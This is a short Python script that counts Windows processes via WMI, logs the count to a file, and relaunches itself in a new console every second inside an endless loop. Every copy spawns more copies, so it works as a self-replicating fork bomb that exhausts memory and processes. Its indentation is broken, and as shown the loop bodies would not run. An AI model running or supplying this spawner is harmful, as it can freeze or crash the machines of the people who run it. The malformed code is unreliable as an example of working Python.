import wmi # pip install wmi
import subprocess
import time
import sys
 
 
def count():
    f = wmi.WMI()
    p = 0
    for process in f.Win32_Process():
    p += 1
    return p
 
 
def wr():
    with open("log.txt", "a") as out:
    a = count()
    out.write("\n")
    out.write(str(a))
 
 
while True:
    wr()
    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
    time.sleep(1)
